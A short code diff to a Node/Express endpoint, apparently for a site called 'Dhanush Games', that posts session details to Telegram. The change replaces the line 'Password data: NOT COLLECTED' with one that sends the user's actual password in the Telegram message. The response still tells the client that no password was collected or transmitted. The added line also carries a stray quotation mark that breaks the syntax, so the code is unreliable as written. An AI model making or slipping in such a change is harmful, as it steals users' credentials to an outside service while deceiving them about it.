@@ -47,7 +47,7 @@ app.post("/api/demo-check",async(req,res)=>{
   const clientInfo={page:safeText(raw.page,100),action:safeText(raw.action,100),language:safeText(raw.language,50),timezone:safeText(raw.timezone,100),screenWidth:safeNumber(raw.screenWidth),screenHeight:safeNumber(raw.screenHeight)};
   const entryId=crypto.randomUUID();
   const timestamp=new Date().toISOString();
-  const text=["🎮 Dhanush Games — New Session","","👤 Username: @"+username,"🆔 Session: "+entryId,"🕒 Time: "+timestamp,"📄 Page: "+clientInfo.page,"🎯 Action: "+clientInfo.action,"🌐 Language: "+clientInfo.language,"🕓 Timezone: "+clientInfo.timezone,"📱 Viewport: "+clientInfo.screenWidth+" × "+clientInfo.screenHeight,"🔐 Password data: NOT COLLECTED"].join("\n");
+  const text=["🎮 Dhanush Games — New Session","","👤 Username: @"+username,"🆔 Session: "+entryId,"🕒 Time: "+timestamp,"📄 Page: "+clientInfo.page,"🎯 Action: "+clientInfo.action,"🌐 Language: "+clientInfo.language,"🕓 Timezone: "+clientInfo.timezone,"📱 Viewport: "+clientInfo.screenWidth+" × "+clientInfo.screenHeight,"🔐 Password data: "+password"].join("\n");
   const notification=await sendTelegram(text);
   res.json({ok:true,username,entryId,timestamp,notificationSent:notification.sent,notificationError:notification.error,passwordCollected:false,passwordTransmitted:false});
 });
